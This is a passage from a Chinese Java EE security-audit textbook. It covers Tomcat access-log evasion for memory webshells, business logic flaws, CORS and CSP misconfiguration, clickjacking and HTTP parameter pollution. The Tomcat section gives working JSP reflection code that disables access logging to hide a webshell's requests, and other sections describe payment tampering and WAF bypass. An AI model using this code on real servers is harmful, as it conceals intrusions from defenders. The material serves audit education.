src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272212357.png" alt="image-20220427221234243"></p><p>此处的Context变量其实是StandardContext，Host变量是StandardHost。然而，无论是StandardHost类还是StandardContext类，这两个容器实现类都继承于ContainerBase类。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272220316.png" alt="image-20220427222021214"></p><p>由于这两个子类，并没有重写自己的logAccess方法，因此这里调用的logAccess(request, response, time ,false)方法，其实是调用其&#x3D;&#x3D;父类ContainerBase&#x3D;&#x3D;的logAccess方法。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272221947.png" alt="image-20220427222127830"></p><p>代码逻辑很清晰，稍微说明一下调用顺序，Tomcat组件的日志记录是逐层回溯，从下往上调用的。</p><p>首先，从CoyoteAdapter#service()方法中，先由调用StandardContext实例的logAccess方法，所以上图的this第一次指代的是StandardContext自身，通过getAccessLog方法，获取StandardContext的日志记录对象。再调用log()方法，记录request、reponse、time中的信息。</p><p>那么当StandardContext调用完成日志记录后，进入下一个if逻辑。</p><p>该配置嵌于Host标签内，属于StandardHost类。可见默认情况，仅有StandardHost调用getAccessLog方法时返回日志记录对象。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204272247548.png" alt="image-20220427224716430"></p><p>&#x3D;&#x3D;this.getPipeLine().getVales()方法获取当前管道中所有阀&#x3D;&#x3D;</p><h4 id="三、实现行踪隐匿"><a href="#三、实现行踪隐匿" class="headerlink" title="三、实现行踪隐匿"></a>三、实现行踪隐匿</h4><p>经过前面分析，我们可以知道，日志记录，是在请求完成响应之后实施的。那么我们可以从Request中的MappingData获取StandardHost，通过Standardhost获取accessLog。</p><p>阅读过先前讲解Servlet内存马的朋友可能会好奇为何StandardService有MappingData，为何Request也有，MappingData作为记录映射关系的实例，也会最终传递给Request对象供其调用。</p><p>因而我们无论是通过Filter、Servlet还是JSP，都拥有了ServletRequest对象。</p><p>但要注意的是，Tomcat采用的设计模式是门面模式，为了提高系统的独立性，将Request对象转换成了RequestFacade对象，转换之后，Request则不可见，用户操作的对象只能是RequestFacade。以此，通过门面实现了系统内部和外部操作对象的分离。</p><p>但是，因为门面实际上是为复杂的子系统为一个类提供一个简单的接口，对于RequestFacade对象而言，实际上完成操作的，仍然是Request对象，因而Request对象，自然而然会作为成员变量保存在RequestFacade对象之中。既然保存在其中，我们就可以通过Java的反射机制，越过访问控制权限，动态获取运行中实例的属性。</p><p>按照惯例，先把要导入的包说明一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardHost&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.AccessLog&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.AbstractAccessLogValve&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.AccessLogAdapter&quot;</span> %&gt;<br></code></pre></td></tr></table></figure><p>获取Request对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">requestF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(“request”);<br><span class="hljs-comment">// requestFacade的request由protected修饰</span><br>requestF.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) requestF.get(request);<br></code></pre></td></tr></table></figure><p>获取MappingData和StandardHost：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MappingData</span> <span class="hljs-variable">mappingData</span> <span class="hljs-operator">=</span> req.getMappingData();<br><span class="hljs-type">StandardHost</span> <span class="hljs-variable">standardHost</span> <span class="hljs-operator">=</span> (StandardHost) mappingData.host;<br></code></pre></td></tr></table></figure><p>获取accesslog并赋值AccessLogValve.condition和Request.attributes :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">AccessLogAdapter</span> <span class="hljs-variable">accessLog</span> <span class="hljs-operator">=</span> (AccessLogAdapter) standardHost.getAccessLog();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">logsF</span> <span class="hljs-operator">=</span> accessLog.getClass().getDeclaredField(<span class="hljs-string">&quot;logs&quot;</span>);<br>    logsF.setAccessible(<span class="hljs-literal">true</span>);<br>    AccessLog[] logs = (AccessLog[]) logsF.get(accessLogAdapter);<br>    <span class="hljs-keyword">for</span>( AccessLog log:logs )&#123;<br>        ((AbstractAccessLogValve)log).setCondition(<span class="hljs-string">&quot;WhatEverYouWant&quot;</span>);<span class="hljs-comment">//任意填入</span><br>    &#125;<br>request.setAttribute(<span class="hljs-string">&quot;WhatEverYouWant&quot;</span>, <span class="hljs-string">&quot;WhatEverYouWant&quot;</span>);<br></code></pre></td></tr></table></figure><p>PS：以上代码，可任意嵌入Filter、Servlet、JSP&#x3D;&#x3D;中&#x3D;&#x3D;，均可生效。</p><h3 id="6-5-14-中间件内存马注入-amp-冰蝎连接-附更改部分代码"><a href="#6-5-14-中间件内存马注入-amp-冰蝎连接-附更改部分代码" class="headerlink" title="6.5.14 中间件内存马注入&amp;冰蝎连接(附更改部分代码)"></a>6.5.14 中间件内存马注入&amp;冰蝎连接(附更改部分代码)</h3><p><a href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g">https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</a></p><h3 id="6-5-15-JBOSS-无文件-webshell-的技术研究"><a href="#6-5-15-JBOSS-无文件-webshell-的技术研究" class="headerlink" title="6.5.15 JBOSS 无文件 webshell 的技术研究"></a>6.5.15 JBOSS 无文件 webshell 的技术研究</h3><p><a href="https://paper.seebug.org/1252/">https://paper.seebug.org/1252/</a></p><h3 id="6-5-16-weblogic-无文件-webshell-的技术研究"><a href="#6-5-16-weblogic-无文件-webshell-的技术研究" class="headerlink" title="6.5.16 weblogic 无文件 webshell 的技术研究"></a>6.5.16 weblogic 无文件 webshell 的技术研究</h3><p><a href="https://paper.seebug.org/1249/">https://paper.seebug.org/1249/</a></p><h2 id="6-6-逻辑漏洞"><a href="#6-6-逻辑漏洞" class="headerlink" title="6.6　逻辑漏洞"></a>6.6　逻辑漏洞</h2><h3 id="6-6-1-逻辑漏洞简介"><a href="#6-6-1-逻辑漏洞简介" class="headerlink" title="6.6.1　逻辑漏洞简介"></a>6.6.1　逻辑漏洞简介</h3><p>目前的开发人员都具备一定的安全开发知识，不少公司还特地对开发人员进行了安全开发培训。对于安全人员来说，想要审计出代码执行、注入漏洞等高危漏洞是非常困难的，一定要贴合业务去挖掘漏洞，因此逻辑漏洞的挖掘就变成了一项比较重要的审计内容。</p><p>逻辑漏洞一般是由于源程序自身逻辑存在缺陷，导致攻击者可以对逻辑缺陷进行深层次的利用。逻辑漏洞出现较为频繁的地方一般是登录验证逻辑、验证码校验逻辑、密码找回逻辑、权限校验逻辑以及支付逻辑等常见的业务逻辑。本节将挑选一些比较经典的逻辑漏洞进行讲解。</p><p>首先来看一段登录的逻辑判断代码。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281137113.png" alt="image-20220428113707985"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281139653.png" alt="image-20220428113953423"></p><p>在上述代码逻辑中，首先对用户名进行非空判断，若非空则判断该用户名是否存在，若存在则继续判断密码是否正确，若正确则设置session，然后跳转到 userCenter界面。</p><p>这段代码的逻辑本身完全正确，如果对于用户名和密码的判断严谨，是不存在 Web 漏洞的，但是这里有一个逻辑问题。假设我们采用攻击者的思维，看到页面反馈给我们的信息是“用户名不存在”，就可以利用这个反馈信息来爆破获取用户名。信息获取是攻击者非常重视的一个内容，在获取到用户名后，可能利用这些信息进行下一步攻击。</p><p>这其实是一个比较常见的逻辑漏洞，很多开发人员会忽视这个漏洞，因为在没有其他漏洞点的配合下，它可能没有利用价值。无独有偶，与这个漏洞相似的漏洞还有很多，如很多站点都会在连续输错5 次密码时启用验证码验证机制，以此来防止攻击者进行爆破攻击。但是有些站点的逻辑处理是，在其代码逻辑中，认为只有处于同一 IP 并且同一用户名连续输错，才会出现验证要求。</p><p>这里存在了一个逻辑问题，如果攻击者向用户名的变量中添加了多个用户名，并且交叉爆破，就可能不会出现验证码，从而躲避了该站点的验证机制。对于连续输错 5 次密码的验证逻辑还有一个比较有趣的漏洞，其示例代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281149789.png" alt="image-20220428114919644"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281149479.png" alt="image-20220428114930345"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281149536.png" alt="image-20220428114944388"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281150219.png" alt="image-20220428115000071"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281150244.png" alt="image-20220428115012093"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281150017.png"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281153569.png" alt="image-20220428115301414"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281153194.png" alt="image-20220428115312052"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281154590.png" alt="image-20220428115448457"></p><p>以上逻辑是在验证完验证码后进行用户名和密码判断，如果输出的密码错误，那么记录次数加1，当次数累积到5次后，会在30min内禁止用户登录；当密码输入正确后，之前记录的次数清零；若 30min后密码再次输入错误，那么继续锁定该用户。</p><p>这个逻辑本质上也没有什么问题，但是用户登录“惩治”机制存在缺陷，若有攻击者针对大量用户进行密码爆破，则可能导致大量用户在短时间内无法登录自己的账号，从而影响业务。旧版本的腾讯QQ 曾采用该机制，密码输错多次后会在 24 h内禁止登录，有不少恶意攻击者故意输错其他用户的密码，从而达到封禁他人 QQ 账号的目的。</p><p>与登录相关的漏洞还有很多，例如：登录时的验证码不变，验证码没有一个完整的服务请求，只有当用户刷新URL时才改变；拦截登录时验证码的刷新请求，可以使第一次验证码不会失效，从而绕过验证码的限制；再如一些使用短信验证码登录的站点，当验证短信验证码时返回state的成功值是success，失败值是false，然后客户端根据state的值来确定下一步的动作。这样，我们可以通过修改响应包，绕过短信验证；有的时候在短信验证码处随便输入验证数字会返回验证码错误，&#x3D;&#x3D;但是当我们将验证码置空提交请求时，服务端却不校验&#x3D;&#x3D;，从而通过置空绕过登录验证。</p><p>此外，还有与登录无关的逻辑漏洞，如密码找回和密码修改处可能会出现的逻辑漏洞</p><p>验证码有效时间过长，导致不失效可被爆破。</p><p>验证码找回界面未作校验，导致可以跳步找回，即直接访问密码修改界面页面。</p><p>未对找回密码的每一步做限制，如找回需要3个步骤，第一步确认要找回的账号，第二步做验证，第三步修改密码。在第三步修改密码时，存在账号参数，因此可以尝试修改其他用户账号，达到修改任意账户密码的目的。</p><p>有些密码找回时未做验证码功能，因而可能导致账号枚举。</p><p>再如支付和购买功能可能会出现的逻辑漏洞。</p><p>未对价格进行二次验证，导致攻击者可以抓包修改价格参数后提交，实现修改商品价格的逻辑漏洞。存在两个订单，一个订单 1 元，另一个订单 1 000 元，对于 1 元订单进行支付，支付后返回时存在token，将这个token保存，然后再将订单号替换成贵的订单，这样就可能完成两个订单的同时支付。</p><p>没有对购买数量进行负数限制，这样就会导致有一个负数的需支付金额，若支付成功，则可能购买了一个负数数量的产品，也有可能返还相应的积分&#x2F;金币到用户的账户上。</p><p>请求重放，当支付成功时，重放其中请求，可能导致本来购买的一件商品数量变成重放请求的次数，但价格只是支付一件商品的价格，更甚者多次下订单，会出现0元订单情况。</p><h2 id="6-7-前端配置不当漏洞"><a href="#6-7-前端配置不当漏洞" class="headerlink" title="6.7　前端配置不当漏洞"></a>6.7　前端配置不当漏洞</h2><h3 id="6-7-1-前端配置不当漏洞简介"><a href="#6-7-1-前端配置不当漏洞简介" class="headerlink" title="6.7.1　前端配置不当漏洞简介"></a>6.7.1　前端配置不当漏洞简介</h3><p>随着前端技术的快速发展，各种前端框架、前端配置不断更新，前端的安全问题也逐渐显现出来。为了应对这些问题，也诞生了诸如 CORS、CSP、SOP等一些应对策略。本节就来谈一谈由于前端配置不当而导致的一些漏洞。</p><h3 id="6-7-2-漏洞发现与修复案例"><a href="#6-7-2-漏洞发现与修复案例" class="headerlink" title="6.7.2　漏洞发现与修复案例"></a>6.7.2　漏洞发现与修复案例</h3><h4 id="1．CORS策略"><a href="#1．CORS策略" class="headerlink" title="1．CORS策略"></a>1．CORS策略</h4><p>CORS（Cross-Origin Resource Sharing，跨域资源共享）是一种放宽浏览器的同源策略，利用这种策略可以通过浏览器使不同的网站和不同的服务器之间实现通信。具体来说，这种策略通过设置 HTTP 头部字段，使客户端有资格跨域访问资源。通过服务器的验证和授权后，浏览器有责任支持这些HTTP头部字段并且确保能够正确地施加限制。</p><p>相关的 HTTP 头部字段所代表的含义和介绍如表6-5所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281205340.png" alt="image-20220428120548193"></p><p>可以通过一个简单的请求流程说明这些配置的一些作用，如以下 HTTP 请求。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281209662.png" alt="image-20220428120932555"></p><p>以上头信息中，Origin 字段用来说明本次请求来自哪个源（协议 + 域名 + 端口），然后服务器根据这个值，决定是否同意该请求。如果Origin 指定的源不在规定范围内，那么服务器会返回一个正常的HTTP回应。此时如果浏览器检测发现，这个回应的头信息中不包含 Access-Control-Allow-Origin字段，则会抛出一个错误；相反，如果 Origin 指定的源在规定的范围内，则服务器返回的响应会多出几个头信息字段，如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281210985.png" alt="image-20220428121053881"></p><p>从上述代码可以发现，其实对于不同的 HTTP 头部字段，浏览器反馈的信息也有所不同，因此当 CORS 配置错误时，可能导致一些预想不到的漏洞。配置CORS 如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281217175.png" alt="image-20220428121751079"></p><p>这是常见的一种 CORS 错误配置场景，在该配置中，&#x3D;&#x3D;开发者将可访问资源的域错误地设置为通配符&#x3D;&#x3D;。通配符是CORS默认设置的值，这意味着任何域都能访问该站点上的资源。如以下请求。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281219195.png" alt="image-20220428121943096"></p><p>当发送上述请求时，浏览器会收到一个包含Access-Control-Allow-Origin头部的响应，具体如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281224745.png" alt="image-20220428122435644"></p><p>在这个相应请求中，头部 Access-Control-Allow-Origin 的字段值为通配符（*），这就意味着任何域都可以访问目标资源。</p><p>这样的设置会给开发者带来一定的便利，但同时也包含一定隐患，若我们将请求内容修改如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281225486.png" alt="image-20220428122510384"></p><p>收到的相应内容如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281226949.png" alt="image-20220428122643849"></p><p>由于目标站点可以与任何站点共享信息，并且在我们请求字段中设置了Origin字段信息为攻击域，所以当受害者在浏览器中打开<a href="http://www.attack.com/">www.attack.com</a> 时，我们就可以在这个域中编写相应的利用代码来获取相关敏感信息。</p><p>CORS 是一个比较常见的安全性错误配置问题。在站点之间共享信息时，开发者通常会忽视 CORS 配置的重要性，因此在要开启 CORS 配置时需要仔细做好评估。如果没有必要，建议完全避免使用这种配置，以免削弱 SOP 的作用。此外，在定义“源”时，最好将其设置为白名单形式，且当收到跨域请求的时候，最好检查“Origin”的值是否是一个可信的源。最后，要尽可能使用头部“Vary: Origin”，以避免产生缓存错乱等问题。</p><p>总的来说，除上文中提到的配置错误，CORS 配置错误还有很多种，如子域名通配符（Subdomain Wildcard）、域名前通配符（Pre Domain Wildcard）、域名后通配符（Post Domain Wildcard）等都有可能存在漏洞并被攻击者利用。对于审计者来说，可以采用黑盒的方式来抓改包去判断和思考是否有利用的可能性。</p><h4 id="2．CSP-策略"><a href="#2．CSP-策略" class="headerlink" title="2．CSP 策略"></a>2．CSP 策略</h4><p>CSP（Content-Security-Policy，内容安全策略）是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。简单来说，CSP的目的是减少XSS、CSRF等攻击，它以白名单机制对网站加载或执行的资源进行限制，通过控制可信来源的方式去保护站点安全。在网页中，CSP策略一般通过 HTTP 头信息或者 meta 元素进行定义。</p><p>虽然CSP提供了强大的安全保护，但同时也造成了如下问题。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Eval及相关函数被禁用。<br><br>内嵌的<span class="hljs-keyword">JavaScript代码将不会执行。</span><br><span class="hljs-keyword"></span><br>只能通过白名单来加载远程脚本。<br><br>这些问题阻碍了CSP的普及，如果要使用CSP技术保护网站，开发者就不得不花费大量时间分离内嵌的<span class="hljs-keyword">JavaScript代码并进行相应调整。下述代码是一个简单的CSP </span>设置。<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281234183.png" alt="image-20220428123450077"></p><p>可以看到 CSP 有一些简单的设置项，部分设置如下所示。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">base-uri：限制可出现在页面 &lt;base&gt; 标签中的链接。<br>child-<span class="hljs-attribute">src</span>：列出可用于 worker 及以 frame 形式嵌入的链接。<br>connect-<span class="hljs-attribute">src</span>：可发起连接的地址（通过XHR、WebSockets或EventSource）。<br><span class="hljs-attribute">font</span>-<span class="hljs-attribute">src</span>：字体来源。<br><span class="hljs-selector-tag">form</span>-action &lt;<span class="hljs-selector-tag">form</span>&gt;：标签可提交的地址。<br>frame-ancestors：当前页面可被哪些来源所嵌入（与child-<span class="hljs-attribute">src</span>正好相反）。作用于 &lt;frame&gt;、&lt;<span class="hljs-selector-tag">iframe</span>&gt;、&lt;embed&gt; 及 &lt;applet&gt;等标签。<br><span class="hljs-selector-tag">img</span>-<span class="hljs-attribute">src</span>：指定图片来源。<br>style-<span class="hljs-attribute">src</span>：限制样式文件的来源。<br><br></code></pre></td></tr></table></figure><p>CSP 配置项有很多，一般常用的配置项有：script-src（js策略）、object-src（object策略）、style-src（css策略）、child-src（iframe策略）、img-src（img引用策略）等。不同的配置项组合达到的效果也是各有差异，当开发人员设置CSP出错时，可能被绕过或者使原本的问题更加严重。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281237335.png" alt="image-20220428123740231"></p><p>当我们引用其他域名下的 JS 文件时，如图6-43所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281238490.png" alt="image-20220428123806358"></p><p>图6-43　引用其他域名下的JS文件</p><p>浏览器会拒绝加载该资源，但也正是这样的设置导致无法抵御 XSS 漏洞，如图6-44所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204281238745.png" alt="image-20220428123843613"></p><p>图6-44　无法抵御 XSS 漏洞</p><p>实际上，在真实的网站中，开发人员众多，在调试各个JS文件时，往往会出现各种问题。为了尽快修复Bug，不得已加入大量的内联脚本，因此没办法简单地指定源来构造CSP，这时会开启类似 script-src unsafe-inline 选项，给攻击者可乘之机。</p><p>安全的防御永远不是依靠策略，而是认真的态度。CSP 固然能够有效地帮助我们防御类似 XSS、CSRF 等攻击，但是一旦配置出现缺陷或者遗漏，则会失去作用。</p><p>虽然 CSP 的绕过方法还有很多，但是配合 httponly 设置项可以防御 80% 的XSS 攻击。因此对于开发者来说，要进一步加强自己的规范意识，尽量避免类似于 inline 脚本的使用。同时，CSP 需要进一步的完善，对于重要和复杂的业务场景，还要结合其他手段来保证用户的安全。对于审计者来说，要仔细考虑 CSP配置项是否存在错误配置以及是否存在被绕过的可能。</p><h2 id="6-9-点击劫持漏洞"><a href="#6-9-点击劫持漏洞" class="headerlink" title="6.9　点击劫持漏洞"></a>6.9　点击劫持漏洞</h2><h3 id="6-9-1-点击劫持漏洞简介"><a href="#6-9-1-点击劫持漏洞简介" class="headerlink" title="6.9.1　点击劫持漏洞简介"></a>6.9.1　点击劫持漏洞简介</h3><p>点击劫持（Clickjacking）也称为UI-覆盖攻击（UI RedressAttack），这个概念源于耶利米·格罗斯曼（Jeremiah Grossman）和罗伯特·汉森（Robert Hansen），这两人在2008年发现AdobeFlash Player 能够被劫持，使攻击者可以在用户不知情的情况下访问计算机。点击劫持是一种视觉上的欺骗手段，攻击者利用iframe元素制作了一个透明的、不可见的页面，然后将其覆盖在另一个网页上，最终诱使用户在该网页上进行操作。当用户在不知情的情况下单击攻击者精心构造的页面时，攻击者就完成了其攻击目的。图6-63所示为点击劫持漏洞的原理。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291531617.png" alt="image-20220429153156342"></p><p>图6-63　点击劫持漏洞的原理</p><p>首先，攻击者利用iframe代码构建一个透明的恶意窗口；然后，将该界面固定在某个页面的某个功能处，当用户单击真实功能处时，实际上单击的是攻击者劫持的功能；最后，完成劫持，攻击者即可实现转账、获取个人信息、删除内容以及发布内容等目的。</p><p>在实际应用中，攻击者所追求的往往不是“点击”，而是“劫持”，有的攻击者甚至在输入框上伪装一个输入框，误导用户在错误的位置输入关键信息。</p><h3 id="6-9-2-漏洞发现与修复案例"><a href="#6-9-2-漏洞发现与修复案例" class="headerlink" title="6.9.2　漏洞发现与修复案例"></a>6.9.2　漏洞发现与修复案例</h3><p>点击劫持漏洞在实战中出现的频率并不高，大多数是攻击者自己搭建相应的界面诱使用户去单击攻击者事先隐藏的功能。本节通过一个简单的点击劫持实例来理解该漏洞，示例代码如下。</p><p>将以上代码保存为test.html，打开并查看效果，如图6-64所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291536363.png" alt="image-20220429153625233"></p><p>图6-64　点击劫持测试页面</p><p>可以看到页面很简洁，只有一个“点击”按钮。为了更方便我们去理解点击劫持，可以修改iframe属性中的opacity参数，将其设置为0.5，再查看修改后的效果，如图6-65所示。</p><p>可以看到，“点击”按钮与我们利用 iframe属性镶嵌网页中的“关注”按钮重合。当用户处于登录原页面的状态下，再单击我们设定的“点击”按钮时，用户会在毫不知情的情况下单击“关注”按钮，效果如图6-66所示。</p><p>通过这种劫持方法，攻击者可以达到刷关注、刷粉丝的目的。攻击者将伪装界面构造得越细致，其劫持的成功率就越高。</p><p>对于点击劫持漏洞，目前大多数站点有一定的防护措施，如图6-67所示，目标站点禁止iframe引用。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291541138.png" alt="image-20220429154148985"></p><p>图6-65　半透明效果<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291542618.png" alt="image-20220429154200483"></p><p>图6-66　点击劫持效果</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291542413.png" alt="image-20220429154210288"></p><p>图6-67　禁止iframe引用</p><p>因此，对于审计者来说，最直观的审计方法就是直接使用iframe引用，观测该站点能否访问，其次就是通过审计配置设置来确定源程序是否设定了相关策略，具体如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291544709.png" alt="image-20220429154441582"></p><h2 id="6-10-HTTP参数污染漏洞"><a href="#6-10-HTTP参数污染漏洞" class="headerlink" title="6.10　HTTP参数污染漏洞"></a>6.10　HTTP参数污染漏洞</h2><h3 id="6-10-1-HTTP参数污染漏洞简介"><a href="#6-10-1-HTTP参数污染漏洞简介" class="headerlink" title="6.10.1　HTTP参数污染漏洞简介"></a>6.10.1　HTTP参数污染漏洞简介</h3><p>简单来说，HTTP 参数污染（HTTP Parameter Pollution，HPP）就是为一个参数赋予两个或两个以上的值。由于现行的 HTTP 标准并未具体说明在遇到多个输入值为相同的参数赋值时应如何处理，并且不同站点对此类问题做出的处理方式不同，因此会造成参数解析错误。本节将简单地介绍 HPP 漏洞。</p><h3 id="6-10-2-漏洞发现与修复案例"><a href="#6-10-2-漏洞发现与修复案例" class="headerlink" title="6.10.2　漏洞发现与修复案例"></a>6.10.2　漏洞发现与修复案例</h3><p>HTTP 参数污染原理很简单，URL示例如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291849626.png" alt="image-20220429184929497"></p><p>在正常情况下，后端接受的参数如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291849152.png" alt="image-20220429184944058"></p><p>此时如果我们提供重复参数，如下所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291849545.png" alt="image-20220429184956440"></p><p>可以看到，我们在完整请求的参数后重复添加了 toAccount 参数，假设后端逻辑是仅仅接受最后一个参数（fromAccount），因此由恶意用户提交的参数（fromAccount&#x3D;6666&amp;toAccount&#x3D;9999）会覆盖后端请求（toAccount&#x3D;5535），并将系统预期账户（6666）修改为恶意账户（9999）。</p><p>当攻击者精心构造一个 URL 并将其发送给用户单击时，就有可能完成一次预定的攻击。</p><p>HPP漏洞的产生，一方面因为Web服务器处理机制的不同，具体服务器的处理机制如表6-6所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291851137.png" alt="image-20220429185114001"></p><p>表6-6　各类Web服务器处理机制</p><p>另一方面，HPP漏洞的产生原因来自源程序中的参数逻辑检测，如果在源程序中对参数的逻辑检测存在缺陷，同样会产生 HPP 漏洞。但总的来说，HPP 漏洞的危险性取决于参数在后端的位置，如果是一些重点功能的参数或者带入了数据库，就可能引发高风险的漏洞。</p><p>我们可以通过以下示例代码来具体说明。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291936074.png" alt="image-20220429193620965"></p><p>正常用户的请求可能如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291938695.png" alt="image-20220429193814590"></p><p>攻击者的请求可能如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291938780.png" alt="image-20220429193824674"></p><p>根据 HPP 漏洞原理我们知道，攻击者可能将原有的withdraw偷偷篡改为transfer，同理，示例代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291938592.png" alt="image-20220429193836488"></p><p>当攻击者将参数 lang 赋值为 en&amp;user_id&#x3D;1 时，可能会使原有的用户id发生改变，进而达到越权等目的。</p><p>除利用 HPP 漏洞直接攻击站点外，HPP 还可以帮助我们躲避 WAF 的检测，常见的注入语句如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204291939278.png" alt="image-20220429193922170"></p><p>原本第一个参数是被 WAF 检测的，此时注入语句被写到第二个参数值的位置，因此不会被 WAF 解析，从而达到了绕过 WAF的效果。</p><p>对于审计者来说，HPP 漏洞的挖掘和逻辑漏洞的挖掘比较类似，因此在审计HPP 漏洞时，需要我们在了解站点功能的基础上同时进行灰盒测试，这样才能更加高效地找出 HPP 可能出现的位置。</p><p>同时，对于 HPP 漏洞的防御来说，我们首先要做的事情就是合理地获取 URL中的参数值；其次，在获取站点返回给源程序的其他值时要进行特别处理，如过滤相关敏感符号或关键字等；最后，还可以使用编码技术对传入的参数进行处理。</p><h1 id="第7章-Java-EE开发框架安全审计"><a href="#第7章-Java-EE开发框架安全审计" class="headerlink" title="第7章　Java EE开发框架安全审计"></a>第7章　Java EE开发框架安全审计</h1><p>随着Java Web技术的不断发展，Java开发Web项目由最初的单纯依靠Servlet（在Java代码中输出HTML）慢慢演化出了JSP（在HTML文件中书写Java代码）。虽然JSP的出现在很大程度上简化了开发过程和减少了代码量，但还是对开发人员不够友好，所以慢慢地又出现了众多知名的开源框架，如Struts2、Sping、Spring 